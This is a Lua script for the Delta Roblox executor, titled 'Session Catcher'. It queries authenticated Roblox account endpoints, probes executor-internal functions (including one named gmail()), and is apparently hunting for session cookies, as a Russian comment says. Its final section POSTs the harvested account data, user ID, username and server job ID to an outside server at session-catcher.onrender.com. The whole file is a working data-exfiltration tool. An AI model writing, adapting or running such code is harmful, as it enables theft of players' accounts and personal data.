-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v5.1 — lightweight: httpget auth + pibble only
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = request or http_request or (http and http.request) or nil
if not httpRequest then return end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local executorName, executorVersion = "Unknown", "Unknown"
pcall(function()
    if identifyexecutor then executorName, executorVersion = identifyexecutor() end
end)

local placeName = "Unknown"
pcall(function()
    placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

-- -----------------------------------------------------------
-- 1. httpget — Delta's function
-- -----------------------------------------------------------
local httpgetResults = {}

local endpoints = {
    "https://www.roblox.com/mobile/api/userinfo",
    "https://users.roblox.com/v1/users/authenticated",
    "https://economy.roblox.com/v1/user/currency"
}

if httpget then
    for _, url in ipairs(endpoints) do
        local ok, resp = pcall(httpget, url)
        if ok and resp then
            httpgetResults["httpget:" .. url] = resp:sub(1, 500)
        else
            httpgetResults["httpget:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
        end
        task.wait(0.5)
    end
end

-- -----------------------------------------------------------
-- 2. game:HttpGet — Roblox native
-- -----------------------------------------------------------
for _, url in ipairs(endpoints) do
    local ok, resp = pcall(function()
        return game:HttpGet(url)
    end)
    if ok and resp then
        httpgetResults["gameHttpGet:" .. url] = resp:sub(1, 500)
    else
        httpgetResults["gameHttpGet:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
    end
    task.wait(0.5)
end

-- -----------------------------------------------------------
-- 3. request() к auth endpoints — может кука в ответе
-- -----------------------------------------------------------
for _, url in ipairs(endpoints) do
    local ok, resp = pcall(httpRequest, {
        Url = url,
        Method = "GET"
    })
    if ok and resp then
        local body = resp.Body or ""
        local headers = {}
        if resp.Headers then
            for k, v in pairs(resp.Headers) do
                headers[tostring(k)] = tostring(v):sub(1, 200)
            end
        end
        httpgetResults["request:" .. url] = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. body:sub(1, 300)
    else
        httpgetResults["request:" .. url] = "FAILED: " .. tostring(resp):sub(1, 200)
    end
    task.wait(0.5)
end

-- -----------------------------------------------------------
-- 4. pibble — все функции по очереди, аккуратно
-- -----------------------------------------------------------
local pibbleResults = {}

pcall(function()
    local genv = getgenv and getgenv() or _G
    local pbl = genv.pibble
    if pbl then
        -- gmail
        local ok1, res1 = pcall(function() return pbl.gmail() end)
        pibbleResults["gmail()"] = ok1 and tostring(res1):sub(1, 500) or "ERR: " .. tostring(res1):sub(1, 200)
        
        task.wait(0.3)
        
        -- washington
        local ok2, res2 = pcall(function() return pbl.washington() end)
        pibbleResults["washington()"] = ok2 and tostring(res2):sub(1, 500) or "ERR: " .. tostring(res2):sub(1, 200)
        
        task.wait(0.3)
        
        -- getpibbles
        local ok3, res3 = pcall(function() return pbl.getpibbles() end)
        pibbleResults["getpibbles()"] = ok3 and tostring(res3):sub(1, 500) or "ERR: " .. tostring(res3):sub(1, 200)
        
        task.wait(0.3)
        
        -- is_pibble
        local ok4, res4 = pcall(function() return pbl.is_pibble() end)
        pibbleResults["is_pibble()"] = ok4 and tostring(res4) or "ERR: " .. tostring(res4):sub(1, 200)
        
        task.wait(0.3)
        
        -- is_detected
        local ok5, res5 = pcall(function() return pbl.is_detected() end)
        pibbleResults["is_detected()"] = ok5 and tostring(res5) or "ERR: " .. tostring(res5):sub(1, 200)
    end
end)

-- -----------------------------------------------------------
-- 5. Delta table — вызываем info-функции
-- -----------------------------------------------------------
local deltaInfo = {}

pcall(function()
    local genv = getgenv and getgenv() or _G
    local d = genv.Delta
    if d then
        local funcs = {"version", "version_num", "version_hash", "roblox_version", 
                       "get_platform", "architecture", "architecture_str",
                       "is_android", "is_ios", "is_mac", "is_vng"}
        for _, fn in ipairs(funcs) do
            if d[fn] then
                local ok, res = pcall(d[fn])
                deltaInfo[fn] = ok and tostring(res):sub(1, 200) or "ERR: " .. tostring(res):sub(1, 100)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    displayName = LocalPlayer.DisplayName,
    placeId = game.PlaceId,
    placeName = placeName,
    jobId = game.JobId,
    executor = executorName,
    executorVersion = executorVersion,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    httpgetResults = httpgetResults,
    pibbleResults = pibbleResults,
    deltaInfo = deltaInfo
}

local success, response = pcall(function()
    return httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Roblox/Delta-Catcher"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[Catcher] v5.1 sent. Status: " .. (response.StatusCode or "unknown"))
    print("[Catcher] HTTP results: " .. table.getn(httpgetResults))
    print("[Catcher] Pibble results: " .. table.getn(pibbleResults))
else
    warn("[Catcher] Failed: " .. tostring(response))
end
